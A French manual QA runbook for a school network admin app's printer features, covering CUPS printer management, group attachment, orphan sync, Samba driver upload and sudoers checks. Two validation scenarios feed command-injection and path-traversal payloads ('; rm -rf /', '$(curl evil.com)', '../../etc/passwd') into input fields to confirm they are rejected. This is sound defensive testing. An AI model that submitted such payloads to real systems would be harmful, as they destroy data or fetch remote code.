# QA manuel — Domaine Imprimantes (CUPS + rattachement parc)

> Runbook E2E pour les stories du domaine Imprimantes. Append-only : chaque
> story ajoute une section avec ses scénarios numérotés stables.

**Pré-requis** :

- VM accessible : `ssh -i ~/.ssh/id_se4fs_vm root@192.168.122.50`
- Migrations à jour : `cd /var/www/sambaedu-reload && php artisan migrate`
- Cache Spatie reset si évolutions permission : `php artisan permission:cache-reset`
- `printer-driver-cups-pdf` installé sur la VM : `apt list --installed | grep cups-pdf`. Si absent : `sudo apt install -y printer-driver-cups-pdf && sudo systemctl restart cups`. Vérifier `lpstat -p cups-pdf` répond.
- Sudoers VM : `/etc/sudoers.d/sambaedu-cups` avec entrées NOPASSWD pour `lpadmin`, `cupsenable`, `cupsdisable`, `smbcontrol smbd reload-printers`, `cancel` (cf. `docs/domains/printers.md`).
- Service CUPS actif : `systemctl status cups`.

---

## Story 6.1 — Consultation, gestion et rattachement parc des imprimantes CUPS

**Date livraison** : 2026-04-27
**Migrations à appliquer** :
- `2026_04_27_120000_create_printers_table`
- `2026_04_27_120100_create_printer_workstation_group_table`

### Section 1 — Couche CUPS (consultation + CRUD)

#### Scénario 6.1-1 — Listing initial avec cups-pdf

1. Se connecter en `admin` (server.admin).
2. Naviguer vers `/parc?tab=printers`.
3. Vérifier l'apparition du banner d'info "Cette interface remplace l'ancienne page de gestion des imprimantes."
4. Si la table SER `printers` est vide après migration : lancer `php artisan printers:sync` → `cups-pdf` apparaît dans la liste avec badge `non rattachée` (jaune).
5. Vérifier les colonnes : Nom (`cups-pdf`), URI (`cups-pdf:/`), État (`idle` vert), File (`0`), Lieu, Modèle, Parcs (vide), Actions.
6. Latence chargement < 500 ms (sur ≤ 5 imprimantes).

#### Scénario 6.1-2 — Ajout via modale + insertion SER + pivot

1. Cliquer "Ajouter une imprimante".
2. La modale s'ouvre avec les sections : Configuration CUPS, Métadonnées SER, Rattachement aux parcs.
3. Remplir :
   - Nom : `imp-test-e2e`
   - URI : `socket://192.0.2.10:9100`
   - Description CUPS : `Test E2E`
   - Lieu : `Salle informatique`
   - Modèle : sélectionner "Generic PostScript Printer"
   - Description SER : `Imprimante de test pour la story 6.1`
   - Cocher au moins un parc dans la liste (ex: `salle-test`).
4. Cliquer "Créer".
5. Toast success "Imprimante imp-test-e2e créée".
6. La modale se ferme, la liste se rafraîchit, `imp-test-e2e` apparaît avec le chip parc rattaché.
7. Vérification BDD : `sudo -u postgres psql -d sambaedu -c "SELECT cups_name, created_by_user_id, description_ser, orphan FROM printers WHERE cups_name='imp-test-e2e';"` → 1 row, `orphan=false`, `created_by_user_id` = id de l'admin connecté, `description_ser` rempli.
8. Vérification pivot : `psql -d sambaedu -c "SELECT * FROM printer_workstation_group WHERE cups_name='imp-test-e2e';"` → 1 row avec `attached_at` et `attached_by_user_id` rempli.
9. Vérification CUPS : `lpstat -p imp-test-e2e` répond `printer imp-test-e2e is idle`.

#### Scénario 6.1-3 — Modification de la configuration et des rattachements

1. Cliquer "Configurer" sur `imp-test-e2e`.
2. La modale s'ouvre pré-remplie avec config CUPS + description_ser + rattachements.
3. Modifier :
   - Description CUPS → `Test E2E modifiée`
   - Description SER → `Test description SER mise à jour`
   - Décocher le parc précédemment rattaché.
4. Cliquer "Enregistrer".
5. Toast success "Configuration mise à jour".
6. La liste se rafraîchit : description CUPS modifiée, badge `non rattachée` apparaît (warning).
7. Vérification BDD : `description_ser` mis à jour, pivot vide pour cette imprimante.

#### Scénario 6.1-4 — Toggle enable/disable

1. Cliquer le bouton pause sur `imp-test-e2e` (état `idle`).
2. Toast success "Imprimante imp-test-e2e désactivée".
3. La ligne affiche état `disabled` (badge rouge), bouton play.
4. Cliquer le bouton play.
5. Toast success "Imprimante imp-test-e2e activée".
6. Retour à état `idle` (badge vert).
7. Vérification CUPS : `lpstat -l -p imp-test-e2e` reflète l'état courant.

#### Scénario 6.1-5 — Compteur file d'attente

1. Soumettre 2 jobs sur `cups-pdf` :
   ```bash
   echo "Test 1" | lp -d cups-pdf
   echo "Test 2" | lp -d cups-pdf
   ```
2. Rafraîchir `/parc?tab=printers`.
3. Colonne File pour `cups-pdf` affiche `2`.
4. Vider la file (les jobs sont normalement traités par cups-pdf en background, sinon : `cancel -a cups-pdf`).
5. Rafraîchir → File = `0`.

#### Scénario 6.1-6 — Erreur CUPS structurée

1. Tenter de créer une imprimante avec un PPD invalide :
   - Nom : `imp-bad-ppd`
   - URI : `socket://192.0.2.99:9100`
   - Modèle : (forger une valeur invalide via DevTools — par défaut le select n'expose que des PPD valides).
2. Erreur attendue : toast error "Erreur CUPS : <première ligne stderr>".
3. Aucune ligne SER ne doit avoir été créée (`SELECT * FROM printers WHERE cups_name='imp-bad-ppd';` → 0 row).

#### Scénario 6.1-7 — Validation injection malicieuse

1. Tenter via DevTools (`$wire.set('newName', '; rm -rf /')`) ou directement dans le champ Nom : `; rm -rf /`.
2. Cliquer "Créer".
3. Erreur de validation affichée sous le champ Nom : "Le nom de l'imprimante ne respecte pas le format requis".
4. Aucune commande shell n'est exécutée (vérifier `journalctl -u cups` : pas d'entrée `lpadmin`).

#### Scénario 6.1-8 — Suppression cascade pivot

1. Sur une imprimante rattachée à un parc : cliquer "Supprimer".
2. `wire:confirm` : "Supprimer définitivement l'imprimante {nom} ?". Confirmer.
3. Toast success "Imprimante {nom} supprimée".
4. Ligne disparaît du tableau.
5. Vérification BDD : ligne `printers` supprimée, ligne pivot `printer_workstation_group` supprimée (cascade).
6. Vérification CUPS : `lpstat -p {nom}` → `lpstat: No destinations added.`

---

### Section 2 — Couche métier rattachement parc + sync orphan

#### Scénario 6.1-9 — Vue admin : tous + filtres rattachement/orphans

1. En tant qu'admin, sur `/parc?tab=printers` : vérifier l'apparition des 4 boutons filtres : Toutes / Rattachées / Non rattachées / Orphelines.
2. Cliquer chaque filtre, valider que la liste se filtre correctement :
   - "Rattachées" : seules les imprimantes avec ≥ 1 chip parc.
   - "Non rattachées" : imprimantes CUPS sans pivot, exclus orphans.
   - "Orphelines" : uniquement les rows SER `orphan=true`.

#### Scénario 6.1-10 — Drift CUPS hors SER → orphan

1. Pré-condition : `imp-test-e2e` existe et est rattachée à un parc.
2. Supprimer côté CUPS hors SER : `sudo lpadmin -x imp-test-e2e`.
3. Lancer `php artisan printers:sync`.
4. Sortie console : `printers:sync OK — ajoutées : 0, marquées orphan : 1, restaurées : 0.`
5. Vérification BDD : ligne SER `imp-test-e2e` toujours présente, `orphan=true`. La pivot **n'a pas été supprimée** (rattachement préservé).
6. UI admin : sélectionner filtre "Orphelines" → `imp-test-e2e` apparaît avec badge `orphan` (rouge).

#### Scénario 6.1-11 — Réintroduction → restauration orphan=false

1. Pré-condition : `imp-test-e2e` est en orphan (issue scénario 10).
2. Recréer côté CUPS : `sudo lpadmin -p imp-test-e2e -E -v socket://192.0.2.10:9100 -m drv:///sample.drv/generic.ppd`.
3. Lancer `php artisan printers:sync`.
4. Sortie console : `ajoutées : 0, marquées orphan : 0, restaurées : 1.`
5. Vérification BDD : `imp-test-e2e.orphan=false`, rattachements toujours présents.
6. UI admin : badge orphan disparu, chips parc toujours visibles.

#### Scénario 6.1-12 — Idempotence sync

1. Sur état aligné CUPS↔SER, lancer `php artisan printers:sync` 2 fois consécutives.
2. La 2è exécution affiche : `ajoutées : 0, marquées orphan : 0, restaurées : 0.`
3. Vérifier qu'aucun timestamp `updated_at` n'a été modifié dans `printers`.

#### Scénario 6.1-13 — Mode dry-run

1. État incohérent (ex: scénario 10 sans restauration).
2. Lancer `php artisan printers:sync --dry-run`.
3. Sortie : `printers:sync [dry-run] — ajoutées : 0, marquées orphan : 1, restaurées : 0.`
4. Vérifier qu'**aucune** modification n'a été faite en BDD (`SELECT orphan FROM printers WHERE cups_name='imp-test-e2e';` → toujours `false` ou la valeur précédente).

#### Scénario 6.1-14 — Filtrage utilisateur lambda scopé Epic 7

1. Créer un user `prof-test` avec `role=prof`, **sans** `server.admin` global.
2. Lui accorder une délégation `server.admin` sur le parc `salle-info-1` :
   ```sql
   -- Ou via UI /users/{id}/delegations
   ```
3. S'assurer que `imp-test-e2e` est rattachée à `salle-info-1` mais que `cups-pdf` ne l'est pas.
4. Se connecter en `prof-test` → `/parc?tab=printers`.
5. Vérifier :
   - `imp-test-e2e` apparaît (rattachée à `salle-info-1`).
   - `cups-pdf` n'apparaît pas (non rattachée).
   - Pas de filtres admin (Toutes / Rattachées / Orphelines masqués).
   - Boutons "Configurer" / "Désactiver" / "Supprimer" présents sur `imp-test-e2e` (délégué scopé).

#### Scénario 6.1-15 — Refus délégué sur orphan

1. Pré-condition : une imprimante orphan rattachée au parc `salle-info-1`.
2. En tant que `prof-test` (délégué sur `salle-info-1`) : naviguer `/parc?tab=printers`.
3. L'imprimante orphan **n'apparaît pas** (scope `forUser->nonOrphan()`).
4. Tentative de forge via DevTools : `Livewire.find('XYZ').deletePrinter('imp-orph')` → réponse 403.

#### Scénario 6.1-16 — Forgery payload côté lambda

1. En tant que user lambda **sans** délégation : naviguer `/parc?tab=printers`.
2. Liste vide (message "Aucune imprimante disponible pour vos parcs.").
3. Forge via DevTools : `Livewire.find('XYZ').addPrinter()` (avec props pré-remplies via `$wire.set`).
4. Réponse 403 (Gate::authorize bloque).

---

### Section 3 — Planification + sudoers + non-régression

#### Scénario 6.1-17 — Planification quotidienne

1. Sur la VM : `php artisan schedule:list`.
2. Vérifier la présence de `printers:sync` à `03:30` (cron daily, `withoutOverlapping` + `runInBackground`).

#### Scénario 6.1-18 — Sudoers en place

1. `sudo -l -U www-admin` : doit lister les commandes NOPASSWD attendues (lpadmin, cupsenable, cupsdisable, smbcontrol, cancel).
2. Aucune entrée wildcard (`*`).

#### Scénario 6.1-19 — Non-régression onglets parc existants

1. `/parc?tab=groups` : onglet Groupes fonctionne.
2. `/parc?tab=machines` : onglet Postes fonctionne (actions wake/shutdown/restart 4.2/4.3 OK).
3. Aucune dégradation visuelle ni d'action.

#### Scénario 6.1-20 — Migrations rollbackables

1. `php artisan migrate:rollback --step=2` → `printer_workstation_group` puis `printers` droppées sans erreur.
2. `php artisan migrate` → re-création OK.
3. Re-lancer `printers:sync` : reconstruit la table SER depuis CUPS.

---

## Story 6.2 — Pilotes Windows (FR19)

**Date livraison** : 2026-05-20

**Migrations à appliquer** :
- `2026_05_20_120000_create_printer_drivers_table`

**Pré-requis spécifiques 6.2** :
- `[print$]` configuré côté Samba (legacy SambaEdu standard).
- Compte machine `se4fs$` Kerberos opérationnel (`klist -k` ou `samba-tool` confirme la présence du keytab).
- Sudoers v2 enrichis : `rpcclient`, `smbclient`, `chown www-admin:www-admin /var/lib/samba/printers/x64/*`, `rm /var/lib/samba/printers/x64/*` (cf. `docs/domains/printers.md` section « Sudoers v2 — Story 6.2 »).
- Au moins un poste Windows 10 pivot joignable (`smbclient -L //w10pivot --use-kerberos=required` répond) avec ≥ 1 imprimante locale partagée et un driver installé (idéal : « Generic / Generic PostScript Printer », universel x64).
- `cups-pdf` toujours présent (héritage 6.1) pour servir de cible CUPS lors des tests.

### Section 4 — Drivers Windows dans la modale édit imprimante (admin)

#### Scénario 6.2-1 — Listing drivers visible dans la modale édit (admin)

1. Se connecter en `admin` (server.admin).
2. `/parc?tab=printers`, cliquer « Configurer » sur l'imprimante `cups-pdf`.
3. La modale s'ouvre. Faire défiler jusqu'à la section « Drivers Windows ».
4. Vérifier que la section :
   - Liste les drivers SER associés (initialement vide → message « Aucun driver Windows associé »).
   - Affiche le driver actif Samba (`samba.smb_driver`) en en-tête, si l'imprimante est publiée.
   - Affiche un bouton « Téléverser un driver ».
5. Vérifier l'absence de banner d'erreur Samba.

#### Scénario 6.2-2 — Section drivers masquée pour user lambda

1. Se déconnecter, se connecter en user lambda (sans `server.admin`).
2. `/parc?tab=printers` : la liste affiche les imprimantes rattachées à ses parcs (héritage 6.1).
3. Cliquer « Configurer » : la section « Drivers Windows » est **absente** (Blade `@can('manage-printer')`).
4. Forge DevTools : `Livewire.find('XYZ').uploadDriver()` → réponse 403.

#### Scénario 6.2-3 — Banner Samba injoignable

1. Sur la VM : `sudo systemctl stop smbd`.
2. En tant qu'admin : ouvrir la modale édit `cups-pdf`.
3. La section « Drivers Windows » affiche un banner `alert-warning` « Samba injoignable — drivers indisponibles ».
4. Les boutons « Téléverser », « Détacher », « Supprimer driver » sont **désactivés**.
5. `sudo systemctl start smbd` puis ré-ouvrir la modale → banner disparu.

### Section 5 — Workflow upload depuis pivot W10

#### Scénario 6.2-4 — Upload happy-path depuis pivot W10

1. Sur un poste W10 pivot (ex. `W10PIVOT`), installer le driver « Generic / Generic PostScript Printer ». Partager une imprimante locale avec ce driver (`Generic PS`).
2. Côté SE5 : ouvrir la modale édit `cups-pdf` (admin), cliquer « Téléverser un driver ».
3. Modale upload : saisir `W10PIVOT`, cliquer « Lister les drivers ».
4. Sélectionner la ligne `Generic PS` (radio), renseigner « Driver salle A » dans notes, cliquer « Téléverser et associer ».
5. Vérifier sur la VM :
   - `ls -la /var/lib/samba/printers/x64/` contient `pscript5.dll`, `PSCRIPT.PPD`, `ps5ui.dll`, `pscript.hlp` (proprio `www-admin:www-admin`).
   - `rpcclient -c 'enumdrivers' se4fs --use-kerberos=required` retourne `Generic / Generic PostScript Printer`.
   - `rpcclient -c 'getprinter "cups-pdf"' se4fs --use-kerberos=required` retourne le driver attaché.
   - Table SER : `select * from printer_drivers where printer_cups_name='cups-pdf'` → ligne `source=upload-w10`, `created_by_user_id=<id admin>`, `notes='Driver salle A'`.
6. Côté UI : toast succès + section drivers actualisée (1 ligne, badge `actif`).

#### Scénario 6.2-5 — Upload Samba down

1. Sur la VM : `sudo systemctl stop smbd`.
2. Ouvrir la modale édit `cups-pdf` → banner Samba injoignable + bouton « Téléverser » désactivé.
3. Re-démarrer smbd : `sudo systemctl start smbd`.
4. Forcer un test sans pivot (Samba down mid-flight) — interrompre `smbd` après le clic « Lister les drivers » puis sélectionner et cliquer « Téléverser et associer » : un toast d'erreur explicite apparaît (« Service Samba injoignable — téléversement annulé »).

#### Scénario 6.2-6 — Upload pivot W10 injoignable

1. Éteindre le poste pivot `W10PIVOT`.
2. Ouvrir modale upload, saisir `W10PIVOT`, cliquer « Lister les drivers ».
3. Toast d'erreur : « Poste pivot W10PIVOT injoignable — vérifier qu'il est allumé ».
4. Aucune ligne SER créée. `ls /var/lib/samba/printers/x64/` inchangé.

#### Scénario 6.2-7 — Upload driver nom invalide (forge)

1. Ouvrir modale upload, saisir `W10PIVOT` comme pivot.
2. Forge via DevTools : `$wire.set('newDriverName', '; rm -rf /')` puis `Livewire.find(id).uploadDriver()`.
3. Validation rejette → message d'erreur « Nom de driver invalide ». Aucune commande shell exécutée. Aucune ligne SER insérée.
4. Tester d'autres payloads : `../../etc/passwd`, `$(curl evil.com)`, backticks, null byte — tous rejetés.

### Section 6 — Détachement et suppression

#### Scénario 6.2-8 — Détachement driver d'une imprimante

1. Avoir un driver rattaché à `cups-pdf` (scénario 6.2-4 réussi).
2. Ouvrir la modale édit `cups-pdf` → section drivers → cliquer « Détacher » (icône `link-slash`).
3. Confirmer le `wire:confirm`.
4. Vérifier sur la VM : `rpcclient -c 'getprinter "cups-pdf"' se4fs --use-kerberos=required` retourne un driver vide.
5. Vérifier SER : ligne `printer_drivers` supprimée pour `cups-pdf` + `x64` + `<driver_name>`.
6. UI : toast succès, liste rafraîchie sans la ligne.

#### Scénario 6.2-9 — Suppression driver protégée si rattaché à imprimante

1. Avoir un driver SER rattaché à ≥ 1 imprimante.
2. Cliquer « Supprimer driver » dans la section drivers (icône poubelle).
3. Toast d'erreur explicite : « Détacher d'abord le driver de toutes les imprimantes : cups-pdf » (ou liste).
4. `rpcclient enumdrivers se4fs` montre le driver toujours présent (non supprimé).

#### Scénario 6.2-10 — Suppression driver OK si non rattaché

1. Détacher d'abord (scénario 6.2-8). La ligne SER disparaît mais le driver reste dans Samba.
2. Naviguer dans l'onglet `/parc?tab=drivers` (admin only).
3. Filtrer « Sans imprimante » : retrouver le driver.
4. Ouvrir une autre modale d'imprimante non rattachée, cliquer « Supprimer driver ».
5. Vérifier `rpcclient enumdrivers se4fs --use-kerberos=required` → le driver ne figure plus.
6. Vérifier `ls /var/lib/samba/printers/x64/` → fichiers physiques supprimés (`pscript5.dll`, etc.).

### Section 7 — Synchronisation et résilience

#### Scénario 6.2-11 — `printer-drivers:sync` détecte un driver Samba hors SER

1. Sur la VM : ajouter un driver hors SER : `sudo /usr/bin/rpcclient se4fs --use-kerberos=required -c 'adddriver "Windows x64" "Foo:foo.dll:FOO.PPD:NULL:NULL:NULL:NULL:" "3"'`.
2. Lancer : `php artisan printer-drivers:sync`.
3. Vérifier les logs (`storage/logs/laravel.log`) : `[printer-drivers:sync] — driver Samba présent sans ligne SER (rattachement manuel requis)` avec `driver_key=Foo|x64`.
4. La table SER n'est PAS auto-rempli (cf. note de tête PrinterDriversSyncCommand) — l'admin doit créer le rattachement via la modale upload.

#### Scénario 6.2-12 — `printer-drivers:sync` skip si Samba down

1. Créer une ligne SER non-orphan : `INSERT INTO printer_drivers (printer_cups_name, architecture, driver_name, source, orphan) VALUES ('cups-pdf', 'x64', 'Safe Driver', 'upload-w10', false);`
2. `sudo systemctl stop smbd`.
3. `php artisan printer-drivers:sync` → exit code != 0.
4. Output : `Samba injoignable — synchronisation annulée pour préserver l'audit SER.`
5. Vérifier SER : `Safe Driver` n'a pas été marqué orphan.
6. `sudo systemctl start smbd` → re-run sync OK (idempotent).

### Section 8 — Planification + sudoers + non-régression

#### Scénario 6.2-13 — Planification quotidienne

1. `php artisan schedule:list` doit lister `printer-drivers:sync` à `03:35` (cron daily, `withoutOverlapping` + `runInBackground`).
2. Vérifier l'écart de 5 min avec `printers:sync` (03:30).

#### Scénario 6.2-14 — Sudoers v2 en place

1. `sudo -l -U www-admin` : doit lister les commandes NOPASSWD attendues :
   - `/usr/bin/lpadmin`, `/usr/sbin/cupsenable`, `/usr/sbin/cupsdisable`, `/usr/bin/smbcontrol` (héritage 6.1)
   - `/usr/bin/rpcclient` (6.2)
   - `/usr/bin/smbclient` (6.2)
   - `/bin/chown www-admin:www-admin /var/lib/samba/printers/x64/*` (6.2)
   - `/bin/rm /var/lib/samba/printers/x64/*` (6.2)
2. Aucune entrée wildcard `/usr/bin/rpcclient *` (RCE).

#### Scénario 6.2-15 — Migrations rollbackables

1. `php artisan migrate:rollback --step=1` → `printer_drivers` droppée sans erreur (les FKs CASCADE depuis `printers` ne bloquent pas).
2. `php artisan migrate` → re-création OK.
3. Re-lancer `printer-drivers:sync` (idempotent) : log « drivers Samba sans SER » mais ne crashe pas.

#### Scénario 6.2-16 — Non-régression 6.1

1. `/parc?tab=printers` : tous les flux 6.1 fonctionnent (CRUD, toggle, rattachement parcs).
2. `/parc?tab=groups` et `/parc?tab=machines` : inchangés.
3. `printers:sync` toujours OK à 03:30, indépendamment de l'état de `printer-drivers:sync`.

### Section 9 — Post-correctifs review (corrections 2026-05-20)

> Scénarios additionnels suite aux corrections appliquées après la review
> adversariale (Sonnet + second avis Opus). Couvrent les findings #1, #2,
> #6 (Q3A retry), #14 (Q4A lock), #21 (Q1A enumprinters auto-attach), #23
> (Q2A flex-wrap responsive).

#### Scénario 6.2-17 — Upload driver pour imprimante avec underscore (régression #1)

1. Créer une imprimante CUPS `imp_mine` (URI socket://192.0.2.10:9100) via la modale ajout.
2. Ouvrir la modale d'édition d'`imp_mine`.
3. Vérifier que la section « Drivers Windows » s'affiche sans banner « Samba injoignable » faux positif.
4. Cliquer « Téléverser un driver » → saisir pivot W10 + sélectionner driver → cliquer « Téléverser et associer ».
5. Toast success. Vérifier en BDD : `SELECT * FROM printer_drivers WHERE printer_cups_name='imp_mine';` retourne la ligne attendue.

> **Régression antérieure** : avant fix #1, `validatePivotHostname($cupsName)` rejetait les underscores → faux 403 + impossible d'uploader.

#### Scénario 6.2-18 — Rollback fichiers après upload partiellement échoué (régression #2)

1. Sur la VM, désactiver temporairement `rpcclient adddriver` (ex. corrompre les sudoers `/etc/sudoers.d/sambaedu-cups` ligne rpcclient).
2. Ouvrir modale édit imprimante → « Téléverser un driver » → workflow normal.
3. L'upload doit échouer à l'étape 3 (registerDriver). Toast d'erreur s'affiche.
4. Vérifier que les fichiers déposés à l'étape 2 (`/var/lib/samba/printers/x64/*.dll`, `*.ppd`, etc.) ont été supprimés : `ls -la /var/lib/samba/printers/x64/` ne doit plus contenir les fichiers du driver tentés.
5. Restaurer les sudoers.

#### Scénario 6.2-19 — Bouton « Réessayer association » (Q3A — fix #6)

1. Sur la VM, modifier temporairement `smbcontrol smbd reload-printers` pour qu'il échoue (drift sudoers).
2. Lancer un upload driver depuis le pivot. L'étape `setdriver` (rpcclient attach) doit échouer en post-registerDriver.
3. Modale upload se ferme, toast warning « Driver enregistré côté Samba mais association à <imprimante> échouée. Utilisez Réessayer association ».
4. Dans la modale d'édit, vérifier la présence d'un encart jaune « Driver <name> enregistré côté Samba mais non associé » avec bouton « Réessayer association ».
5. Restaurer les sudoers.
6. Cliquer « Réessayer association ». Toast success. La ligne SER apparaît + driver attaché côté Samba.

#### Scénario 6.2-20 — Verrou anti-concurrence sync (Q4A — fix #14)

1. Ouvrir 2 sessions admin dans 2 navigateurs (ou onglets privés).
2. Dans la session 1, aller à `/parc?tab=drivers` et cliquer « Synchroniser ».
3. Dans la session 2 immédiatement après, cliquer « Synchroniser ».
4. La session 2 doit afficher un toast warning « Une synchronisation est déjà en cours. Réessayer dans quelques secondes ». Pas de double-sync.

#### Scénario 6.2-21 — Auto-attachement via enumprinters (Q1A — fix #21)

1. Pré-requis : avoir une imprimante CUPS `imp1` côté SER + un driver `Generic / PS` publié côté Samba qui pointe sur `imp1` côté Samba (via `rpcclient setdriver "imp1" "Generic / PS"`).
2. Vérifier qu'il N'EXISTE PAS de ligne `printer_drivers` pour (imp1, x64, Generic / PS) : `SELECT * FROM printer_drivers WHERE printer_cups_name='imp1';`
3. Lancer `php artisan printer-drivers:sync`.
4. Sortie console : `auto-attachés : 1, cups_name absent SER : 0, marqués orphan : 0, restaurés : 0`.
5. Re-vérifier la BDD : une ligne `(printer_cups_name='imp1', architecture='x64', driver_name='Generic / PS', source='synced', created_by_user_id=NULL)` doit exister.
6. Relancer la sync (idempotence) : sortie `auto-attachés : 0` (la ligne SER existe déjà).

#### Scénario 6.2-22 — Responsive 4e onglet drivers ≤ 380px (Q2A — fix #23)

1. Sur Chromium DevTools, basculer en mode mobile, viewport 360px de large (iPhone SE).
2. Naviguer vers `/parc?tab=drivers`.
3. Les 4 onglets « Tous / Avec imprimante / Sans imprimante / Orphans » s'enroulent sur 2 lignes (pas de débordement horizontal).
4. La colonne « Imprimantes rattachées » avec N chips wrap correctement (chips sur plusieurs lignes via `flex flex-wrap gap-1`).
5. Pas de scroll horizontal sur l'écran.

#### Scénario 6.2-23 — Suppression driver sans rattachement (régression test AC10 — fix #3)

1. Créer un driver Samba via upload (workflow normal), puis détacher de toutes les imprimantes via le bouton « Détacher ».
2. Vérifier en BDD : `SELECT * FROM printer_drivers WHERE driver_name='<X>';` retourne 0 ligne.
3. Dans la modale édit d'une imprimante, cliquer « Supprimer » sur le driver dans la table Drivers Windows (côté Samba, hors de notre table SER).
4. Le service `deleteDriver` est appelé. Toast success « Driver X supprimé ».
5. Vérifier `rpcclient enumdrivers se4fs` : le driver n'apparaît plus.
